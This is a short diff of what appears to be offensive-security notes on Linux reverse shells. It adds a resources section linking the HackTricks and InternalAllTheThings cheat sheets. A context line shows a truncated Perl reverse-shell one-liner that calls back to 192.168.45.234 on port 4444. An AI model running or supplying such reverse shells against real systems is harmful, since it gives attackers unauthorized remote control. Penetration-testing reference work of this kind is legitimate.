@@ -50,3 +50,8 @@ perl -e 'use Socket;$i="192.168.45.234";$p=4444;socket(S,PF_INET,SOCK_STREAM,get
 ~/.hacklas/external/hacktricks/src/generic-hacking/reverse-shells/linux.md
 
 ~/.hacklas/external/internal-all-the-things/docs/cheatsheets/shell-reverse-cheatsheet.md
+
+## Resources
+
+- [HackTricks Linux reverse shells](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html) — local path above is this topic
+- [InternalAllTheThings reverse-shell cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) — local path above is this topic
